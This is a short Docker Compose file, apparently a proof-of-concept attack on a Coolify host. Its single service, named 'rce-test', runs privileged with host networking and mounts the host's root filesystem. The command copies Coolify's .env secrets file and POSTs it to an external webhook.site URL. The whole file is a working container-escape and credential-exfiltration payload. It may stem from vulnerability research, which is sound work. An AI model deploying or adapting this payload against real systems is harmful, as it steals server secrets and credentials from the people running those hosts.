version: "3.8"
services:
  rce-test:
    image: alpine:3.19
    privileged: true
    network_mode: host
    volumes:
      - /:/host-root
    command: sh -c "cat /host-root/data/coolify/source/.env > /tmp/test.txt && curl -X POST --data-binary @/tmp/test.txt https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=env_test && sleep 3600"
